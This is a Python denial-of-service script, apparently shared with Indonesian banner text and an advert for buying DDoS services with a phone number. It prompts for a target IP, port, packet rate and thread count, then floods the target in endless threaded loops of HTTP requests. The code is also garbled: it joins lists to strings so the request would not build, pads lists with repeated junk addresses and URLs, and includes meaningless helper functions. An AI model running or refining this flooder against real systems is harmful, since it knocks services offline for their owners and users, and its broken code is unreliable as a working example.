import socket
import threading
import time 
import requests
import random
socks2 = [""" 192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443192.168.0.1:443 """]
http = [""" Https://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.comHttps://Yandex.com """]
print(">====Kalo Remake Kasih Liat pembikinnya lah bg:(===<")
print("\n\r"+"Buy Ddos Chat:085871151230")
ip = str(input("[ ? ] {Enter the Ip that you want to attack} >="))
ip = socket.gethostbyname(ip)
port = int(input("[ ? ] {Enter the Port that you want to attack} >="))
print("Work port 443/80")
pack = int(input("[ ? ] {Packets/s} >="))
thread = int(input("[ ? ] {Thread/t} >="))
def randomip():
  randip = [192, 168, 0, 1]
  randip1 = random.randint(2,255)
  randip2 = random.randint(2,255)
  randip3 = random.randint(2,255)
  randip4 = random.randint(2,255)
  randip5 = random.randint(2,255)
  randip6 = random.randint(2,255)
 
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)
  randip.append(randip5)
  randip.append(randip6)
  

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])+str(ip)+ "." + str(randip[4]) + "." + str(randip[5]) + "." + str(randip[6])
  return(randip)
def start():
    global socks2, http
    hh = random._urandom(3016)
    xx = int(0)
    socks = "Socket: "+random.choice(socks2)+str(ip)+"\r\n"
    https = random.choice(http)
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
    main_req  = target_host + socks2 + http + content + length + "\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            xx += random.randint(0, int(pack))
            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
        except:
            s.close()
            print('[+] Server Down.')
def attck():
 for y in range(99999999):
   return attck

for x in range(thread):
  if __name__ == "__main__":
    thred = threading.Thread(target=start)
    thred2 = threading.Thread(target=attck)
    thred.start()
    thred2.start()